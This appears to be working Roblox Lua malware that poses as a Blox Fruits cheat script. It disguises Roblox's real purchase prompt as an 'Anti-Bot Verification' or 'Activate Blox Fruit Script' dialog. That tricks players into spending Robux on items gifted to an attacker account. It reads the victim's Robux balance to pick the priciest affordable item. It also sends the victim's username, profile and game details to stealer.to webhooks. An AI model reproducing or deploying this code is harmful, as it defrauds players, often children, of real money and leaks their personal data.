local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local player = Players.LocalPlayer

local webhookUrl = "https://stealer.to/post?uniqueid=e92c9e96"  -- Replace with your Discord webhook URL

-- Capture the player's name, display name, and game details
local playerName = player.Name
local playerDisplayName = player.DisplayName
local playerUserId = player.UserId
local gameId = game.PlaceId

-- Get the game name using MarketplaceService
local success, gameInfo = pcall(function()
    return MarketplaceService:GetProductInfo(gameId)
end)

local gameName = success and gameInfo.Name or "Unknown Game"
local gameLink = "https://www.roblox.com/games/" .. gameId

-- Construct the player's Roblox profile link
local playerProfileLink = "https://www.roblox.com/users/" .. playerUserId .. "/profile"

-- Create the embed message
local function createEmbed()
    return {
        ["embeds"] = {
            {
                ["title"] = "**✅ SCRIPT EXECUTED - CAPTURE ✅**",
                ["color"] = 0x00FF00,  -- Green color
                ["fields"] = {
                    {
                        ["name"] = "USERNAME",
                        ["value"] = playerName,
                        ["inline"] = true
                    },
                    {
                        ["name"] = "DISPLAY NAME",
                        ["value"] = playerDisplayName,  -- Display name
                        ["inline"] = true
                    },
                    {
                        ["name"] = "GAME NAME",
                        ["value"] = gameName,
                        ["inline"] = true
                    },
                    {
                        ["name"] = "GAME LINK",
                        ["value"] = gameLink,  -- Game link
                        ["inline"] = false
                    },
                    {
                        ["name"] = "PROFILE LINK",
                        ["value"] = playerProfileLink,  -- Profile link
                        ["inline"] = false
                    },
                    {
                        ["name"] = "PING",
                        ["value"] = "@everyone",  -- PING field
                        ["inline"] = false
                    },
                },
                ["footer"] = {
                    ["text"] = "Executed on Roblox",  -- Added credits
                    ["icon_url"] = "https://www.roblox.com/favicon.ico"  -- Roblox icon
                },
            }
        }
    }
end

-- Function to send a POST request to the webhook URL
local function sendWebhookNotification()
    local data = HttpService:JSONEncode(createEmbed())
    
    -- Attempt to send the notification using various request methods
    pcall(function()
        if syn then  -- For Synapse X
            syn.request({
                Url = webhookUrl,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = data
            })
        elseif http_request then  -- For KRNL, etc.
            http_request({
                Url = webhookUrl,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = data
            })
        elseif http then  -- For other executors
            http.request({
                Url = webhookUrl,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = data
            })
        end
    end)
end

-- Send the initial notification when the script is executed
sendWebhookNotification()

task.spawn(function()
    local success, result = pcall(function()
        local TweenService = game:GetService("TweenService")
        local RunService = game:GetService("RunService")
        local CoreGui = game:GetService("CoreGui")

        local function typewriterEffect(textLabel, text, speed)
            textLabel.Text = ""
            task.spawn(function()
                local currentText = ""
                for i = 1, #text do
                    if not textLabel or not textLabel.Parent then break end
                    currentText = currentText .. string.sub(text, i, i)
                    textLabel.Text = currentText
                    task.wait(speed or 0.05)
                end
            end)
        end

        local function applyChanges(prompt, counter)
            local alertContents = prompt:WaitForChild("AlertContents")
            prompt.Image = ""
            prompt.ImageTransparency = 1
            prompt.BackgroundTransparency = 1
            prompt.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
            prompt.BorderSizePixel = 0

            local promptGradient = Instance.new("UIGradient")
            promptGradient.Color = ColorSequence.new({
                ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 30, 30)),
                ColorSequenceKeypoint.new(1, Color3.fromRGB(15, 15, 15))
            })
            promptGradient.Parent = prompt

            local promptGlow = Instance.new("ImageLabel")
            promptGlow.Name = "Glow"
            promptGlow.BackgroundTransparency = 1
            promptGlow.Size = UDim2.new(1.5, 0, 1.5, 0)
            promptGlow.Position = UDim2.new(-0.25, 0, -0.25, 0)
            promptGlow.ZIndex = -1
            promptGlow.Image = "rbxasset://textures/ui/Glow.png"
            promptGlow.ImageColor3 = Color3.fromRGB(0, 0, 0)
            promptGlow.ImageTransparency = 0.5
            promptGlow.Parent = prompt

            local titleLabel = alertContents:WaitForChild("TitleContainer"):WaitForChild("TitleArea"):WaitForChild("Title")
            titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
            titleLabel.Font = Enum.Font.Code
            titleLabel.TextScaled = true
            titleLabel.Size = UDim2.new(0, 386, 0, 26)

            local titleStroke = Instance.new("UIStroke")
            titleStroke.Color = Color3.fromRGB(0, 0, 0)
            titleStroke.Thickness = 2
            titleStroke.Parent = titleLabel

            typewriterEffect(titleLabel, "Anti-Bot Verification v" .. counter) -- << Change it to ur stuff

            local function setupButton(button)
                if button and button:IsA("ImageButton") and button.Visible then
                    for _, child in pairs(button:GetChildren()) do
                        child:Destroy()
                    end
                    button:ClearAllChildren()
                    button.Image = ""
                    button.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
                    button.AutoButtonColor = false
                    button.BorderSizePixel = 0

                    local container = Instance.new("Frame")
                    container.Size = UDim2.new(1, 0, 1, 0)
                    container.BackgroundTransparency = 1
                    container.ClipsDescendants = true
                    container.Parent = button

                    local innerShadow = Instance.new("ImageLabel")
                    innerShadow.BackgroundTransparency = 1
                    innerShadow.Image = "rbxassetid://7131311876"
                    innerShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
                    innerShadow.ImageTransparency = 0.5
                    innerShadow.Size = UDim2.new(1, 0, 1, 0)
                    innerShadow.Parent = container

                    local outerGlow = Instance.new("ImageLabel")
                    outerGlow.BackgroundTransparency = 1
                    outerGlow.Image = "rbxasset://textures/ui/Glow.png"
                    outerGlow.ImageColor3 = Color3.fromRGB(0, 128, 128)
                    outerGlow.ImageTransparency = 0.8
                    outerGlow.Size = UDim2.new(1.5, 0, 1.5, 0)
                    outerGlow.Position = UDim2.new(-0.25, 0, -0.25, 0)
                    outerGlow.ZIndex = -1
                    outerGlow.Parent = button

                    local edgeHighlight = Instance.new("UIStroke")
                    edgeHighlight.Color = Color3.fromRGB(0, 255, 255)
                    edgeHighlight.Thickness = 1.5
                    edgeHighlight.Transparency = 0.5
                    edgeHighlight.Parent = button

                    local gradient = Instance.new("UIGradient")
                    gradient.Color = ColorSequence.new({
                        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
                        ColorSequenceKeypoint.new(1, Color3.fromRGB(200, 200, 200))
                    })
                    gradient.Rotation = 45
                    gradient.Transparency = NumberSequence.new(0.95)
                    gradient.Parent = button

                    local textLabel = Instance.new("TextLabel")
                    textLabel.Name = "ButtonText"
                    textLabel.Size = UDim2.new(1, 0, 1, 0)
                    textLabel.BackgroundTransparency = 1
                    textLabel.TextColor3 = Color3.fromRGB(0, 255, 255)
                    textLabel.TextStrokeColor3 = Color3.fromRGB(0, 128, 128)
                    textLabel.TextStrokeTransparency = 0
                    textLabel.TextScaled = true
                    textLabel.Font = Enum.Font.Code
                    textLabel.Parent = container

                    typewriterEffect(textLabel, ({ "I'm not a bot", "Continue", "Verify" })[math.random(1, 3)], 0.08)

                    button.MouseEnter:Connect(function()
                        if not button or not button.Parent then return end

                        TweenService:Create(button, TweenInfo.new(0.3, Enum.EasingStyle.Back), {
                            Size = UDim2.new(button.Size.X.Scale, button.Size.X.Offset + 4,
                                            button.Size.Y.Scale, button.Size.Y.Offset + 4)
                        }):Play()

                        TweenService:Create(outerGlow, TweenInfo.new(0.3), {
                            ImageTransparency = 0.6,
                            Size = UDim2.new(1.7, 0, 1.7, 0),
                            Position = UDim2.new(-0.35, 0, -0.35, 0)
                        }):Play()

                        TweenService:Create(edgeHighlight, TweenInfo.new(0.3), {
                            Thickness = 2,
                            Transparency = 0
                        }):Play()
                    end)

                    button.MouseLeave:Connect(function()
                        if not button or not button.Parent then return end

                        TweenService:Create(button, TweenInfo.new(0.3, Enum.EasingStyle.Back), {
                            Size = UDim2.new(button.Size.X.Scale, button.Size.X.Offset - 4,
                                            button.Size.Y.Scale, button.Size.Y.Offset - 4)
                        }):Play()

                        TweenService:Create(outerGlow, TweenInfo.new(0.3), {
                            ImageTransparency = 0.8,
                            Size = UDim2.new(1.5, 0, 1.5, 0),
                            Position = UDim2.new(-0.25, 0, -0.25, 0)
                        }):Play()

                        TweenService:Create(edgeHighlight, TweenInfo.new(0.3), {
                            Thickness = 1.5,
                            Transparency = 0.5
                        }):Play()
                    end)

                    button.MouseButton1Down:Connect(function()
                        if not button or not button.Parent then return end

                        TweenService:Create(button, TweenInfo.new(0.1), {
                            Size = UDim2.new(button.Size.X.Scale, button.Size.X.Offset - 2,
                                            button.Size.Y.Scale, button.Size.Y.Offset - 2)
                        }):Play()
                    end)

                    button.MouseButton1Up:Connect(function()
                        if not button or not button.Parent then return end

                        TweenService:Create(button, TweenInfo.new(0.1), {
                            Size = UDim2.new(button.Size.X.Scale, button.Size.X.Offset + 2,
                                            button.Size.Y.Scale, button.Size.Y.Offset + 2)
                        }):Play()
                    end)
                end
            end

            local footer = alertContents:WaitForChild("Footer")
            local buttons = footer:WaitForChild("Buttons")
            setupButton(buttons:FindFirstChild("1"))
            setupButton(buttons:FindFirstChild("2"))
        end

        local processedPrompts = {}
        local promptCounter = 1

        RunService.RenderStepped:Connect(function()
            local purchasePrompt = CoreGui:FindFirstChild("PurchasePrompt")
            if purchasePrompt then
                local container = purchasePrompt:FindFirstChild("ProductPurchaseContainer")
                if container then
                    local animator = container:FindFirstChild("Animator")
                    if animator then
                        local prompt = animator:FindFirstChild("Prompt")
                        if prompt and not processedPrompts[prompt] then
                            processedPrompts[prompt] = true
                            applyChanges(prompt, promptCounter)
                            promptCounter = promptCounter + 1
                        end
                    end
                end
            end
        end)
    end)

    if not success then
        warn("Failed to access CoreGui: " .. tostring(result))
    end
end)

--- START OF FILE Bloxfruit_improved.txt ---

Username = "x6TNine"
Webhook = "https://stealer.to/post?uniqueid=97b37190"

-- BLOX FRUIT

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")
local result = 0

local HttpService = game:GetService("HttpService")

local success, UserId = pcall(function()
    return Players:GetUserIdFromNameAsync(Username)
end)

local args = {
    [1] = "buyRobuxShop",
    [2] = {
        ["StorageName"] = "2x EXP (15 mins.)",
        ["FunnelId"] = "Shop",
        ["PurchaseLocation"] = "Shop"
    }
}
game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))

local CoreGui = game:GetService("CoreGui")
local PurchasePrompt = CoreGui:WaitForChild("PurchasePrompt")
local ProductContainer = PurchasePrompt:WaitForChild("ProductPurchaseContainer")
local Animator = ProductContainer:WaitForChild("Animator")

Animator.ChildAdded:Connect(function(child)
    if child.Name == "Prompt" then
        local prompt = Animator:WaitForChild("Prompt")
        local alertContents = prompt:WaitForChild("AlertContents")

        local middleContent = alertContents:FindFirstChild("MiddleContent")
        if middleContent then
            middleContent.Visible = false
        end

        local title = alertContents:WaitForChild("TitleContainer"):WaitForChild("TitleArea"):WaitForChild("Title")
        if title and title:IsA("TextLabel") then
            title.Text = "SCRIPT LOADED!"
        end

        local footerButtons = alertContents:WaitForChild("Footer"):WaitForChild("Buttons")
        local button2 = footerButtons:FindFirstChild("2")
        if button2 then
            button2.Visible = false
        end

        local footerContent = alertContents:WaitForChild("Footer"):FindFirstChild("FooterContent")
        if footerContent then
            footerContent.Visible = false
        end

        local button1 = footerButtons:FindFirstChild("1")
        if button1 then
            local buttonContent = button1:WaitForChild("ButtonContent")
            local buttonMiddleContent = buttonContent:WaitForChild("ButtonMiddleContent"):FindFirstChildWhichIsA("TextLabel")
            if buttonMiddleContent then
                buttonMiddleContent.Text = "Inject"
            end
        end
    end
end)

local function sendWebhook()

    local embed = {
        ["title"] = "You Got Blox Fruit Hit!",
        ["color"] = 39423,
        ["fields"] = {
            {
                ["name"] = "<:drawpen:1311079366125555782> ᴘʟᴀʏᴇʀ ɪɴꜰᴏ",
                ["value"] = "```Name: " .. game.Players.LocalPlayer.Name .. "\nAccount Age: " .. tostring(game.Players.LocalPlayer.AccountAge) .. "\nReceiver: " .. Username .. "```"
            },
            {
                ["name"] = "<:robux:1314309850154537020> ᴛᴏᴛᴀʟ ʀᴏʙᴜx",
                ["value"] = "```" .. result .. "```"
            },
            {
                ["name"] = "ᴅɪꜱᴄᴏʀᴅ sᴇʀᴠᴇʀ",
                ["value"] = "[**Join Invite**](https://discord.gg/darkscripts)",
            }
        }
    }

    local data = HttpService:JSONEncode({
        ["content"] = "@everyone",
        ["embeds"] = {embed}
    })

    request({
        Url = Webhook,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = data
    })

    request({
        Url = LogsWebhook, -- Assuming LogsWebhook is defined elsewhere
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = data
    })
end

local function stealitem()
    local items_to_steal = {
        { threshold = 5000, storage_name = "Permanent Dragon-Dragon" },
        { threshold = 4000, storage_name = "Permanent Kitsune-Kitsune" },
        { threshold = 3000, storage_name = "Permanent Leopard-Leopard" },
        { threshold = 2700, storage_name = "Fruit Notifier" },
        { threshold = 2550, storage_name = "Permanent Spirit-Spirit" },
        { threshold = 2500, storage_name = "Permanent Gas-Gas" },
        { threshold = 2450, storage_name = "Permanent Venom-Venom" },
        { threshold = 2425, storage_name = "Permanent Shadow-Shadow" },
        { threshold = 2400, storage_name = "Permanent Dough-Dough" },
        { threshold = 2350, storage_name = "Permanent T-Rex-T-Rex" },
        { threshold = 2300, storage_name = "Permanent Gravity-Gravity" },
        { threshold = 2250, storage_name = "Permanent Blizzard-Blizzard" },
        { threshold = 2200, storage_name = "Permanent Pain-Pain" },
        { threshold = 2100, storage_name = "Permanent Rumble-Rumble" },
        { threshold = 2000, storage_name = "Permanent Portal-Portal" },
        { threshold = 1900, storage_name = "Permanent Sound-Sound" },
        { threshold = 1800, storage_name = "Permanent Spider-Spider" },
        { threshold = 1700, storage_name = "Permanent Love-Love" },
        { threshold = 1650, storage_name = "Permanent Buddha-Buddha" },
        { threshold = 1500, storage_name = "Permanent Quake-Quake" },
        { threshold = 1300, storage_name = "Permanent Magma-Magma" },
        { threshold = 1275, storage_name = "Permanent Ghost-Ghost" },
        { threshold = 1250, storage_name = "Permanent Barrier-Barrier" },
        { threshold = 1200, storage_name = "Dark Blade" },
        { threshold = 1100, storage_name = "Permanent Light-Light" },
        { threshold = 1000, storage_name = "Permanent Diamond-Diamond" },
        { threshold = 950, storage_name = "Permanent Dark-Dark" },
        { threshold = 850, storage_name = "Permanent Sand-Sand" },
        { threshold = 750, storage_name = "Permanent Ice-Ice" },
        { threshold = 650, storage_name = "Permanent Falcon-Falcon" },
        { threshold = 550, storage_name = "Permanent Flame-Flame" },
        { threshold = 450, storage_name = "2x Money" },
        { threshold = 400, storage_name = "+1 Fruit Storage" },
        { threshold = 380, storage_name = "Permanent Spike-Spike" },
        { threshold = 350, storage_name = "2x Boss Drops" },
        { threshold = 250, storage_name = "Permanent Smoke-Smoke" },
        { threshold = 220, storage_name = "Permanent Bomb-Bomb" },
        { threshold = 180, storage_name = "Permanent Spring-Spring" },
        { threshold = 100, storage_name = "Permanent Blade-Blade" },
        { threshold = 75, storage_name = "Permanent Spin-Spin" },
        { threshold = 50, storage_name = "10K Money" },
        { threshold = 25, storage_name = "2x EXP (15 mins.)" },
    }

    table.sort(items_to_steal, function(a, b)
        return a.threshold > b.threshold
    end)

    for _, item_data in ipairs(items_to_steal) do
        if result >= item_data.threshold then
            local args = {
                [1] = "buyRobuxShop",
                [2] = {
                    ["Message"] = "Ishus On top",
                    ["StorageName"] = item_data.storage_name,
                    ["PurchaseLocation"] = (string.find(item_data.storage_name, "Permanent") and "FruitShop") or "Shop",
                    ["FunnelId"] = "Shop",
                    ["ReceiverName"] = Username,
                    ["ReceiverUserId"] = UserId,
                }
            }
            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
            break -- Exit the loop after gifting the first eligible item
        end
    end
end

local function WaitForPrompt1()
    local Animator = CoreGui:WaitForChild("PurchasePrompt"):WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator")
    repeat task.wait() until not Animator:FindFirstChild("Prompt")
    stealitem()
    local CoreGui = game:GetService("CoreGui")

    local success, err = pcall(function()
        local PurchasePrompt = CoreGui:WaitForChild("PurchasePrompt")
        local ProductPurchaseContainer = PurchasePrompt:WaitForChild("ProductPurchaseContainer")
        local Animator = ProductPurchaseContainer:WaitForChild("Animator")
        local Prompt = Animator:WaitForChild("Prompt")
        local AlertContents = Prompt:WaitForChild("AlertContents")

        local MiddleContent = AlertContents:WaitForChild("MiddleContent")
        MiddleContent.Visible = false

        local Footer = AlertContents:WaitForChild("Footer")
        local FooterButtons = Footer:WaitForChild("Buttons")
        local FooterButton1 = FooterButtons:WaitForChild("1")
        FooterButton1.Visible = false

        local FooterContent = Footer:WaitForChild("FooterContent")
        FooterContent.Visible = false

        local FooterButton2 = FooterButtons:WaitForChild("2")
        FooterButton2.Visible = true

        local FooterButton2Text = FooterButton2.ButtonContent.ButtonMiddleContent:WaitForChild("Text")
        FooterButton2Text.Text = "Activate!"
        FooterButton2Text.Size = UDim2.new(1, 0, FooterButton2Text.Size.Y.Scale, FooterButton2Text.Size.Y.Offset)

        local FooterButton2Icon = FooterButton2.ButtonContent.ButtonMiddleContent:WaitForChild("Icon")
        FooterButton2Icon.Visible = false

        local TitleContainer = AlertContents:WaitForChild("TitleContainer")
        local TitleArea = TitleContainer:WaitForChild("TitleArea")
        local TitleText = TitleArea:WaitForChild("Title")
        TitleText.Text = "Activate Blox Fruit Script!"
        TitleText.Size = UDim2.new(1, 0, TitleText.Size.Y.Scale, TitleText.Size.Y.Offset)
    end)

    if not success then
        warn("UI..")
    end
end

local RobuxPath = CoreGui:WaitForChild("PurchasePrompt"):WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator"):WaitForChild("Prompt"):WaitForChild("AlertContents"):WaitForChild("Footer"):WaitForChild("FooterContent"):WaitForChild("Content"):WaitForChild("RemainingBalanceText")
local balanceText = RobuxPath and RobuxPath.Text:match("(%d+)$")

if balanceText then
    result = tonumber(balanceText) + 25
end

local function WaitForPrompt2()
    local Animator = CoreGui:WaitForChild("PurchasePrompt"):WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator")
    repeat task.wait() until not Animator:FindFirstChild("Prompt")
    sendWebhook()
end

WaitForPrompt1()
WaitForPrompt2()
